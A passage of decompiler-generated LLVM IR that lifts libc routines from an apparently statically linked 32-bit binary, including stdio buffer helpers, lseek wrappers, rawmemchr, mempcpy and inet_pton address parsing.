  %v3_8066697 = icmp eq i32 %v2_8066697, 0
  %storemerge.in.in.v = select i1 %v3_8066697, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %v4_8066662
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_80666a4 = add i32 %v4_8066662, 16
  %v3_80666a4 = inttoptr i32 %v2_80666a4 to i32*
  %v4_80666a4 = load i32, i32* %v3_80666a4, align 4
  %v5_80666a4 = sub i32 %v0_80666a4, %v4_80666a4
  store i32 %v5_80666a4, i32* %edx.global-to-local, align 4
  %v2_80666a7 = add i32 %v5_80666a4, %storemerge
  store i32 %v2_80666a7, i32* %esi.global-to-local, align 4
  %v1_80666ae = inttoptr i32 %arg2 to i32*
  %v2_80666ae = load i32, i32* %v1_80666ae, align 4
  store i32 %v2_80666ae, i32* %ecx.global-to-local, align 4
  %v1_80666b0 = add i32 %arg2, 4
  %v2_80666b0 = inttoptr i32 %v1_80666b0 to i32*
  %v3_80666b0 = load i32, i32* %v2_80666b0, align 4
  %v1_80666b5 = ashr i32 %v2_80666a7, 31
  %v2_80666b8 = sub i32 %v2_80666ae, %v2_80666a7
  %v7_80666b8 = icmp ult i32 %v2_80666ae, %v2_80666a7
  store i32 %v2_80666b8, i32* %edi.global-to-local, align 4
  %v3_80666bc = zext i1 %v7_80666b8 to i32
  %v4_80666bc = sub i32 %v3_80666b0, %v1_80666b5
  %v5_80666bc = add i32 %v4_80666bc, %v3_80666bc
  store i32 %v5_80666bc, i32* %edx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v2_80666c4 = sub i32 %v5_80666bc, %v3_80666b0
  %v8_80666c4 = xor i32 %v5_80666bc, %v3_80666b0
  %v9_80666c4 = xor i32 %v2_80666c4, %v5_80666bc
  %v10_80666c4 = and i32 %v9_80666c4, %v8_80666c4
  %v11_80666c4 = icmp slt i32 %v10_80666c4, 0
  %v13_80666c4 = icmp slt i32 %v2_80666c4, 0
  store i32 %v2_80666b8, i32* %v1_80666ae, align 4
  %v0_80666c9 = load i32, i32* %edx.global-to-local, align 4
  %v1_80666c9 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80666c9 = add i32 %v1_80666c9, 4
  %v3_80666c9 = inttoptr i32 %v2_80666c9 to i32*
  store i32 %v0_80666c9, i32* %v3_80666c9, align 4
  %v2_80666cc = icmp eq i1 %v13_80666c4, %v11_80666c4
  br i1 %v2_80666cc, label %dec_label_pc_80666ce, label %dec_label_pc_80666d6

dec_label_pc_80666ce:                             ; preds = %dec_label_pc_8066697
  %v12_80666c4 = icmp eq i32 %v2_80666c4, 0
  %v4_80666ce = icmp eq i1 %v12_80666c4, false
  br i1 %v4_80666ce, label %dec_label_pc_80666d4, label %dec_label_pc_80666d0

dec_label_pc_80666d0:                             ; preds = %dec_label_pc_80666ce
  %v0_80666d0 = load i32, i32* %edi.global-to-local, align 4
  %v1_80666d0 = load i32, i32* %ecx.global-to-local, align 4
  %tmp11 = icmp ugt i32 %v0_80666d0, %v1_80666d0
  br i1 %tmp11, label %dec_label_pc_80666d4, label %dec_label_pc_80666d6

dec_label_pc_80666d4:                             ; preds = %dec_label_pc_80666d0, %dec_label_pc_80666ce
  %v0_80666d4 = load i32, i32* %esi.global-to-local, align 4
  %v1_80666d4 = sub i32 0, %v0_80666d4
  store i32 %v1_80666d4, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666d6

dec_label_pc_80666d6:                             ; preds = %dec_label_pc_80666d0, %dec_label_pc_8066697, %dec_label_pc_80666d4
  %v0_80666d6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80666d6 = icmp slt i32 %v0_80666d6, 0
  %v1_80666d8 = icmp eq i1 %v2_80666d6, false
  br i1 %v1_80666d8, label %dec_label_pc_80666eb, label %dec_label_pc_80666da

dec_label_pc_80666da:                             ; preds = %dec_label_pc_80666d6
  store i32 75, i32* inttoptr (i32 -8 to i32*), align 8
  %v0_80666ec.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666eb

dec_label_pc_80666e8:                             ; preds = %dec_label_pc_806667f, %dec_label_pc_806667a
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80666eb

dec_label_pc_80666eb:                             ; preds = %dec_label_pc_80666d6, %dec_label_pc_80666da, %dec_label_pc_80666e8
  %v0_80666ec = phi i32 [ %v0_80666d6, %dec_label_pc_80666d6 ], [ %v0_80666ec.pre, %dec_label_pc_80666da ], [ -1, %dec_label_pc_80666e8 ]
  %v2_80666eb = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_80666eb, i32* @ebx, align 4
  ret i32 %v0_80666ec

; uselistorder directives
  uselistorder i32 %v2_80666c4, { 2, 1, 0 }
  uselistorder i32 %v2_80666a7, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8066672, { 0, 2, 1 }
  uselistorder i16 %tmp, { 0, 2, 1 }
  uselistorder i32 %v4_8066662, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 4, 0, 5, 2, 3, 1, 8, 6, 7 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80666eb, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80666d6, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066697, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_80666f4 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80666fc = add i32 %arg1, 8
  %v2_80666fc = inttoptr i32 %v1_80666fc to i32*
  %v3_80666fc = load i32, i32* %v2_80666fc, align 4
  store i32 %v3_80666fc, i32* %edx.global-to-local, align 4
  %v1_80666ff = add i32 %arg1, 12
  %v2_80666ff = inttoptr i32 %v1_80666ff to i32*
  %v3_80666ff = load i32, i32* %v2_80666ff, align 4
  %v2_8066702 = sub i32 %v3_80666ff, %v3_80666fc
  %v3_8066707 = inttoptr i32 %arg1 to i16*
  %v4_8066707 = call i32 @__stdio_READ(i16* %v3_8066707, i32 %v3_80666fc, i32 %v2_8066702)
  %v0_806670c = load i32, i32* @ebx, align 4
  %v1_806670c = add i32 %v0_806670c, 8
  %v2_806670c = inttoptr i32 %v1_806670c to i32*
  %v3_806670c = load i32, i32* %v2_806670c, align 4
  store i32 %v3_806670c, i32* %edx.global-to-local, align 4
  %v2_806670f = add i32 %v0_806670c, 16
  %v3_806670f = inttoptr i32 %v2_806670f to i32*
  store i32 %v3_806670c, i32* %v3_806670f, align 4
  %v0_8066712 = load i32, i32* %edx.global-to-local, align 4
  %v2_8066712 = add i32 %v0_8066712, %v4_8066707
  store i32 %v2_8066712, i32* %edx.global-to-local, align 4
  %v1_8066714 = load i32, i32* @ebx, align 4
  %v2_8066714 = add i32 %v1_8066714, 20
  %v3_8066714 = inttoptr i32 %v2_8066714 to i32*
  store i32 %v2_8066712, i32* %v3_8066714, align 4
  store i32 %v0_80666f4, i32* @ebx, align 4
  ret i32 %v4_8066707

; uselistorder directives
  uselistorder i32 %v4_8066707, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_806671c = load i32, i32* @ebx, align 4
  %v4_8066720 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8066720, i32* @ebx, align 4
  %v2_8066728 = load i16, i16* %arg1, align 2
  %v3_8066728 = zext i16 %v2_8066728 to i32
  %v2_806672b = and i32 %v3_8066728, %arg2
  %v3_806672b = icmp eq i32 %v2_806672b, 0
  %v1_806672d = icmp eq i1 %v3_806672b, false
  br i1 %v1_806672d, label %dec_label_pc_806673b, label %dec_label_pc_806672f

dec_label_pc_806672f:                             ; preds = %entry
  %v1_806672f = and i32 %v3_8066728, 2176
  %v2_806672f = icmp eq i32 %v1_806672f, 0
  %v1_8066734 = icmp eq i1 %v2_806672f, false
  br i1 %v1_8066734, label %dec_label_pc_8066742, label %dec_label_pc_8066736

dec_label_pc_8066736:                             ; preds = %dec_label_pc_806672f
  %v2_8066736 = or i32 %v3_8066728, %arg2
  %v1_8066738 = trunc i32 %v2_8066736 to i16
  store i16 %v1_8066738, i16* %arg1, align 2
  %v0_806673b.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806673b

dec_label_pc_806673b:                             ; preds = %entry, %dec_label_pc_8066736
  %v0_8066762 = phi i32 [ %v4_8066720, %entry ], [ %v0_806673b.pre, %dec_label_pc_8066736 ]
  %v1_806673b = inttoptr i32 %v0_8066762 to i16*
  %v2_806673b = load i16, i16* %v1_806673b, align 2
  %v2_806673e = and i16 %v2_806673b, 16
  %v3_806673e = icmp eq i16 %v2_806673e, 0
  br i1 %v3_806673e, label %dec_label_pc_806675b, label %dec_label_pc_8066742

dec_label_pc_8066742:                             ; preds = %dec_label_pc_806673b, %dec_label_pc_806672f
  store i32 9, i32* inttoptr (i32 -8 to i32*), align 8
  br label %dec_label_pc_806674e

dec_label_pc_806674e:                             ; preds = %dec_label_pc_806675f, %dec_label_pc_8066742
  %v0_806674e = load i32, i32* @ebx, align 4
  %v1_806674e = inttoptr i32 %v0_806674e to i32*
  %v2_806674e = load i32, i32* %v1_806674e, align 4
  %v1_8066750 = or i32 %v2_806674e, 8
  %v1_8066753 = trunc i32 %v1_8066750 to i16
  %v3_8066753 = inttoptr i32 %v0_806674e to i16*
  store i16 %v1_8066753, i16* %v3_8066753, align 2
  br label %dec_label_pc_8066787

dec_label_pc_806675b:                             ; preds = %dec_label_pc_806673b
  %v2_806675b = and i16 %v2_806673b, 64
  %v3_806675b = icmp eq i16 %v2_806675b, 0
  br i1 %v3_806675b, label %dec_label_pc_806677d, label %dec_label_pc_806675f

dec_label_pc_806675f:                             ; preds = %dec_label_pc_806675b
  %v2_8066763 = call i32 @__stdio_wcommit(i32 %v0_8066762)
  %v1_806676b = icmp eq i32 %v2_8066763, 0
  %v1_806676d = icmp eq i1 %v1_806676b, false
  br i1 %v1_806676d, label %dec_label_pc_806674e, label %dec_label_pc_806676f

dec_label_pc_806676f:                             ; preds = %dec_label_pc_806675f
  %v0_806676f = load i32, i32* @ebx, align 4
  %v1_806676f = add i32 %v0_806676f, 8
  %v2_806676f = inttoptr i32 %v1_806676f to i32*
  %v3_806676f = load i32, i32* %v2_806676f, align 4
  %v2_8066772 = add i32 %v0_806676f, 28
  %v3_8066772 = inttoptr i32 %v2_8066772 to i32*
  store i32 %v3_806676f, i32* %v3_8066772, align 4
  %v0_8066775 = load i32, i32* @ebx, align 4
  %v1_8066775 = inttoptr i32 %v0_8066775 to i32*
  %v2_8066775 = load i32, i32* %v1_8066775, align 4
  %v2_8066775.tr = trunc i32 %v2_8066775 to i16
  %v1_806677a = and i16 %v2_8066775.tr, -65
  %v3_806677a = inttoptr i32 %v0_8066775 to i16*
  store i16 %v1_806677a, i16* %v3_806677a, align 2
  %v0_806677d.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_806677d

dec_label_pc_806677d:                             ; preds = %dec_label_pc_806675b, %dec_label_pc_806676f
  %v2_8066782 = phi i32 [ %v0_8066762, %dec_label_pc_806675b ], [ %v0_806677d.pre, %dec_label_pc_806676f ]
  %v1_806677d = inttoptr i32 %v2_8066782 to i32*
  %v2_806677d = load i32, i32* %v1_806677d, align 4
  %v1_806677f = or i32 %v2_806677d, 1
  %v1_8066782 = trunc i32 %v1_806677f to i16
  %v3_8066782 = inttoptr i32 %v2_8066782 to i16*
  store i16 %v1_8066782, i16* %v3_8066782, align 2
  br label %dec_label_pc_8066787

dec_label_pc_8066787:                             ; preds = %dec_label_pc_806674e, %dec_label_pc_806677d
  %storemerge = phi i32 [ 0, %dec_label_pc_806677d ], [ -1, %dec_label_pc_806674e ]
  %v2_8066787 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8066787, i32* @edx, align 4
  store i32 %v0_806671c, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v3_8066728, { 0, 2, 1 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 5, 3, 4, 2, 1, 0 }
  uselistorder i16 0, { 0, 10, 4, 1, 11, 8, 12, 9, 13, 2, 3, 15, 16, 17, 18, 14, 19, 20, 5, 6, 7 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8066787, { 1, 0 }
  uselistorder label %dec_label_pc_806677d, { 1, 0 }
  uselistorder label %dec_label_pc_806673b, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_806678c = load i32, i32* @ebx, align 4
  store i32 %v0_806678c, i32* %stack_var_-4, align 4
  store i32 %tmp5, i32* @ebx, align 4
  %v1_80667a1 = add i32 %arg1, 4
  %v2_80667a1 = inttoptr i32 %v1_80667a1 to i32*
  %v3_80667a1 = load i32, i32* %v2_80667a1, align 4
  %v4_80667a4 = call i32 @__GI_lseek64(i32 %v3_80667a1)
  %v0_80667ac = load i32, i32* @edx, align 4
  %v2_80667ac = icmp slt i32 %v0_80667ac, 0
  store i32 %v4_80667a4, i32* %ecx.global-to-local, align 4
  br i1 %v2_80667ac, label %dec_label_pc_80667b9, label %dec_label_pc_80667b2

dec_label_pc_80667b2:                             ; preds = %entry
  %v1_80667b2 = load i32, i32* @ebx, align 4
  %v2_80667b2 = inttoptr i32 %v1_80667b2 to i32*
  store i32 %v4_80667a4, i32* %v2_80667b2, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v0_80667b6 = load i32, i32* @edx, align 4
  %v1_80667b6 = load i32, i32* @ebx, align 4
  %v2_80667b6 = add i32 %v1_80667b6, 4
  %v3_80667b6 = inttoptr i32 %v2_80667b6 to i32*
  store i32 %v0_80667b6, i32* %v3_80667b6, align 4
  %v0_80667ba.pre = load i32, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_80667b9

dec_label_pc_80667b9:                             ; preds = %entry, %dec_label_pc_80667b2
  %v0_80667ba = phi i32 [ %v4_80667a4, %entry ], [ %v0_80667ba.pre, %dec_label_pc_80667b2 ]
  %v2_80667bd = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80667bd, i32* @ebx, align 4
  ret i32 %v0_80667ba

; uselistorder directives
  uselistorder label %dec_label_pc_80667b9, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_80667c4 = ptrtoint i8* %arg1 to i32
  %v3_80667cc = call i32 @_strlen(i8* %arg1)
  %v4_80667cc = mul i32 %v3_80667cc, -1
  %v5_80667cc = add i32 %v4_80667cc, -2
  store i32 %v5_80667cc, i32* @ecx, align 4
  %v2_80667ce = add i32 %v4_80667c4, -1
  ret i32 %v2_80667ce

; uselistorder directives
  uselistorder i8* %arg1, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80667d5 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v3_80667e7 = inttoptr i32 %arg1 to i8*
  %v4_80667e7 = call i32 @memcpy(i8* %v3_80667e7, i32 %arg2, i32 %arg3)
  %v0_80667ef = load i32, i32* @esi, align 4
  %v2_80667ef = add i32 %v0_80667ef, %arg3
  store i32 %v0_80667d5, i32* @ebx, align 4
  ret i32 %v2_80667ef
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_80667f9 = load i32, i32* @edx, align 4
  store i32 %v0_80667f9, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* %edi.global-to-local, align 4
  %v0_8066801 = load i32, i32* @ebx, align 4
  store i32 %v0_8066801, i32* %stack_var_-16, align 4
  %v0_8066802 = load i32, i32* @eax, align 4
  store i32 %v0_8066802, i32* %ebx.global-to-local, align 4
  store i1 false, i1* %zf.global-to-local, align 1
  %v2_8066807 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_8066807, i32* %esi.global-to-local, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_806685210 = inttoptr i32 %v0_8066802 to i8*
  %v2_806685211 = load i8, i8* %v1_806685210, align 1
  %v3_806685212 = zext i8 %v2_806685211 to i32
  %v5_806685213 = and i32 %v0_8066802, -256
  %v6_806685214 = or i32 %v3_806685212, %v5_806685213
  store i32 %v6_806685214, i32* %eax.global-to-local, align 4
  %v4_806685415 = icmp eq i8 %v2_806685211, 0
  store i1 %v4_806685415, i1* %zf.global-to-local, align 1
  %v1_806685617 = icmp eq i1 %v4_806685415, false
  br i1 %v1_806685617, label %dec_label_pc_8066812, label %dec_label_pc_8066858

dec_label_pc_8066812:                             ; preds = %entry, %dec_label_pc_8066852.backedge
  %v3_806685220 = phi i32 [ %v3_8066852, %dec_label_pc_8066852.backedge ], [ %v3_806685212, %entry ]
  %v2_806685219 = phi i8 [ %v2_8066852, %dec_label_pc_8066852.backedge ], [ %v2_806685211, %entry ]
  %v0_806681518 = phi i32 [ %v0_8066852.pre, %dec_label_pc_8066852.backedge ], [ %v0_8066802, %entry ]
  store i32 %v3_806685220, i32* %eax.global-to-local, align 4
  %v1_8066815 = add i32 %v0_806681518, 1
  store i32 %v1_8066815, i32* %ebx.global-to-local, align 4
  %v1_8066816 = add nsw i32 %v3_806685220, -48
  store i32 %v1_8066816, i32* @ecx, align 4
  %v9_8066819 = icmp eq i8 %v2_806685219, 57
  store i1 %v9_8066819, i1* %zf.global-to-local, align 1
  %v6_806681c = icmp ugt i32 %v1_8066816, 9
  br i1 %v6_806681c, label %dec_label_pc_806683e, label %dec_label_pc_806681e

dec_label_pc_806681e:                             ; preds = %dec_label_pc_8066812
  %v0_806681e = load i32, i32* %esi.global-to-local, align 4
  %v1_806681e = inttoptr i32 %v0_806681e to i8*
  %v2_806681e = load i8, i8* %v1_806681e, align 1
  %v2_8066821 = zext i8 %v2_806681e to i32
  %v3_8066821 = mul nuw nsw i32 %v2_8066821, 10
  %v2_8066824 = add nsw i32 %v3_8066821, %v1_8066816
  store i32 %v2_8066824, i32* %eax.global-to-local, align 4
  %v9_8066827 = icmp eq i32 %v2_8066824, 255
  store i1 %v9_8066827, i1* %zf.global-to-local, align 1
  %v6_806682c = icmp ugt i32 %v2_8066824, 255
  br i1 %v6_806682c, label %dec_label_pc_806686b, label %dec_label_pc_806682e

dec_label_pc_806682e:                             ; preds = %dec_label_pc_806681e
  %v0_806682e = load i32, i32* @edx, align 4
  %v1_806682e = icmp eq i32 %v0_806682e, 0
  store i1 %v1_806682e, i1* %zf.global-to-local, align 1
  %v1_8066830 = trunc i32 %v2_8066824 to i8
  store i8 %v1_8066830, i8* %v1_806681e, align 1
  %v0_8066832 = load i1, i1* %zf.global-to-local, align 1
  %v1_8066832 = icmp eq i1 %v0_8066832, false
  br i1 %v1_8066832, label %dec_label_pc_8066852.backedge, label %dec_label_pc_8066834

dec_label_pc_8066834:                             ; preds = %dec_label_pc_806682e
  %v0_8066834 = load i32, i32* %edi.global-to-local, align 4
  %v1_8066834 = add i32 %v0_8066834, 1
  store i32 %v1_8066834, i32* %edi.global-to-local, align 4
  %v1_8066835 = add i32 %v0_8066834, -3
  %v6_8066835 = sub i32 2, %v0_8066834
  %v7_8066835 = and i32 %v6_8066835, %v1_8066834
  %v8_8066835 = icmp slt i32 %v7_8066835, 0
  %v9_8066835 = icmp eq i32 %v1_8066835, 0
  store i1 %v9_8066835, i1* %zf.global-to-local, align 1
  %v10_8066835 = icmp slt i32 %v1_8066835, 0
  %v3_8066838 = icmp eq i1 %v10_8066835, %v8_8066835
  %v4_8066838 = icmp eq i1 %v9_8066835, false
  %v5_8066838 = and i1 %v4_8066838, %v3_8066838
  br i1 %v5_8066838, label %dec_label_pc_806686b, label %dec_label_pc_806683a

dec_label_pc_806683a:                             ; preds = %dec_label_pc_8066834
  %v0_806683a = load i32, i32* @edx, align 4
  %v1_806683a = and i32 %v0_806683a, -256
  %v2_806683a = or i32 %v1_806683a, 1
  store i32 %v2_806683a, i32* @edx, align 4
  br label %dec_label_pc_8066852.backedge

dec_label_pc_806683e:                             ; preds = %dec_label_pc_8066812
  %v9_806683e = icmp eq i8 %v2_806685219, 46
  store i1 %v9_806683e, i1* %zf.global-to-local, align 1
  %v1_8066841 = icmp eq i1 %v9_806683e, false
  br i1 %v1_8066841, label %dec_label_pc_806686b, label %dec_label_pc_8066843

dec_label_pc_8066843:                             ; preds = %dec_label_pc_806683e
  %v0_8066843 = load i32, i32* @edx, align 4
  %v1_8066843 = icmp eq i32 %v0_8066843, 0
  store i1 %v1_8066843, i1* %zf.global-to-local, align 1
  br i1 %v1_8066843, label %dec_label_pc_806686b, label %dec_label_pc_8066847

dec_label_pc_8066847:                             ; preds = %dec_label_pc_8066843
  %v0_8066847 = load i32, i32* %edi.global-to-local, align 4
  %v9_8066847 = icmp eq i32 %v0_8066847, 4
  store i1 %v9_8066847, i1* %zf.global-to-local, align 1
  br i1 %v9_8066847, label %dec_label_pc_806686b, label %dec_label_pc_806684c

dec_label_pc_806684c:                             ; preds = %dec_label_pc_8066847
  %v0_806684c = load i32, i32* %esi.global-to-local, align 4
  %v1_806684c = add i32 %v0_806684c, 1
  store i32 %v1_806684c, i32* %esi.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @edx, align 4
  %v1_806684f = inttoptr i32 %v1_806684c to i8*
  store i8 0, i8* %v1_806684f, align 1
  br label %dec_label_pc_8066852.backedge

dec_label_pc_8066852.backedge:                    ; preds = %dec_label_pc_806684c, %dec_label_pc_806683a, %dec_label_pc_806682e
  %v0_8066852.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8066852.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8066852 = inttoptr i32 %v0_8066852.pre to i8*
  %v2_8066852 = load i8, i8* %v1_8066852, align 1
  %v3_8066852 = zext i8 %v2_8066852 to i32
  %v5_8066852 = and i32 %v4_8066852.pre, -256
  %v6_8066852 = or i32 %v3_8066852, %v5_8066852
  store i32 %v6_8066852, i32* %eax.global-to-local, align 4
  %v4_8066854 = icmp eq i8 %v2_8066852, 0
  store i1 %v4_8066854, i1* %zf.global-to-local, align 1
  %v1_8066856 = icmp eq i1 %v4_8066854, false
  br i1 %v1_8066856, label %dec_label_pc_8066812, label %dec_label_pc_8066852.dec_label_pc_8066858_crit_edge

dec_label_pc_8066852.dec_label_pc_8066858_crit_edge: ; preds = %dec_label_pc_8066852.backedge
  %v0_8066858.pre = load i32, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8066858

dec_label_pc_8066858:                             ; preds = %dec_label_pc_8066852.dec_label_pc_8066858_crit_edge, %entry
  %v0_8066858 = phi i32 [ %v0_8066858.pre, %dec_label_pc_8066852.dec_label_pc_8066858_crit_edge ], [ 0, %entry ]
  %v10_8066858 = icmp eq i32 %v0_8066858, 3
  store i1 %v10_8066858, i1* %zf.global-to-local, align 1
  %v7_806685b = icmp sgt i32 %v0_8066858, 3
  br i1 %v7_806685b, label %dec_label_pc_806685d, label %dec_label_pc_806686b

dec_label_pc_806685d:                             ; preds = %dec_label_pc_8066858
  %v3_806685d = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_806685d, i32* %eax.global-to-local, align 4
  %v1_8066861 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8066861 = inttoptr i32 %v1_8066861 to i32*
  store i32 %v3_806685d, i32* %v2_8066861, align 4
  br label %dec_label_pc_806686d

dec_label_pc_806686b:                             ; preds = %dec_label_pc_8066847, %dec_label_pc_8066843, %dec_label_pc_806683e, %dec_label_pc_8066834, %dec_label_pc_806681e, %dec_label_pc_8066858
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_806686d

dec_label_pc_806686d:                             ; preds = %dec_label_pc_806685d, %dec_label_pc_806686b
  %storemerge = phi i32 [ 1, %dec_label_pc_806685d ], [ 0, %dec_label_pc_806686b ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v0_806686d = load i32, i32* @esp, align 4
  %v6_806686d = icmp eq i32 %v0_806686d, -16
  store i1 %v6_806686d, i1* %zf.global-to-local, align 1
  %v2_8066870 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066870, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_8066858, { 1, 0 }
  uselistorder i32 %v3_8066852, { 1, 0 }
  uselistorder i8 %v2_8066852, { 1, 2, 0 }
  uselistorder i32 %v0_8066852.pre, { 1, 0 }
  uselistorder i1 %v9_8066847, { 1, 0 }
  uselistorder i32 %v1_8066835, { 1, 0 }
  uselistorder i32 %v2_8066824, { 1, 2, 0, 3 }
  uselistorder i8 %v2_806685219, { 1, 0 }
  uselistorder i1* %zf.global-to-local, { 1, 2, 3, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12, 0, 14 }
  uselistorder i32* %edi.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 2, 1, 6, 4, 3, 5, 0 }
  uselistorder i8 57, { 1, 0 }
  uselistorder label %dec_label_pc_806686d, { 1, 0 }
  uselistorder label %dec_label_pc_806686b, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8066812, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066875 = load i32, i32* @ebp, align 4
  %v0_8066876 = load i32, i32* @edi, align 4
  %v0_8066877 = load i32, i32* @esi, align 4
  %v0_8066878 = load i32, i32* @ebx, align 4
  store i32 %v0_8066878, i32* %stack_var_-16, align 4
  %v4_8066878 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8066880 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8066880, i32* @esi, align 4
  %v9_8066884 = icmp eq i32 %arg1, 2
  br i1 %v9_8066884, label %dec_label_pc_8066894, label %dec_label_pc_8066889

dec_label_pc_8066889:                             ; preds = %entry
  %v9_8066889 = icmp eq i32 %arg1, 10
  %v1_806688c = icmp eq i1 %v9_8066889, false
  br i1 %v1_806688c, label %dec_label_pc_8066a30, label %dec_label_pc_80668a4

dec_label_pc_8066894:                             ; preds = %entry
  store i32 %tmp53, i32* @edx, align 4
  store i32 %v4_8066880, i32* @eax, align 4
  %v3_806689a = call i32 @inet_pton4(i32 %v0_8066878, i32 %v0_8066877, i32 %v0_8066876)
  store i32 %v3_806689a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8066a3f

dec_label_pc_80668a4:                             ; preds = %dec_label_pc_8066889
  %v2_80668a4 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_80668a4, i32* @edx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-32, align 4
  %v4_80668ac = load i1, i1* @df, align 1
  %v5_80668ac = select i1 %v4_80668ac, i32 -4, i32 4
  %v6_80668ac = add i32 %v5_80668ac, %v2_80668a4
  store i32 %v6_80668ac, i32* %edi.global-to-local, align 4
  %v2_80668ad = inttoptr i32 %v6_80668ac to i32*
  store i32 0, i32* %v2_80668ad, align 4
  %v3_80668ad = load i32, i32* %edi.global-to-local, align 4
  %v6_80668ad = add i32 %v3_80668ad, %v5_80668ac
  store i32 %v6_80668ad, i32* %edi.global-to-local, align 4
  %v0_80668ae = load i32, i32* %eax.global-to-local, align 4
  %v2_80668ae = inttoptr i32 %v6_80668ad to i32*
  store i32 %v0_80668ae, i32* %v2_80668ae, align 4
  %v3_80668ae = load i32, i32* %edi.global-to-local, align 4
  %v6_80668ae = add i32 %v3_80668ae, %v5_80668ac
  store i32 %v6_80668ae, i32* %edi.global-to-local, align 4
  %v0_80668af = load i32, i32* %eax.global-to-local, align 4
  %v2_80668af = inttoptr i32 %v6_80668ae to i32*
  store i32 %v0_80668af, i32* %v2_80668af, align 4
  %v3_80668af = load i32, i32* %edi.global-to-local, align 4
  %v6_80668af = add i32 %v3_80668af, %v5_80668ac
  store i32 %v6_80668af, i32* %edi.global-to-local, align 4
  %v0_80668b0 = load i32, i32* @esi, align 4
  %v1_80668b0 = inttoptr i32 %v0_80668b0 to i8*
  %v2_80668b0 = load i8, i8* %v1_80668b0, align 1
  %v11_80668b0 = icmp eq i8 %v2_80668b0, 58
  %v1_80668b3 = icmp eq i1 %v11_80668b0, false
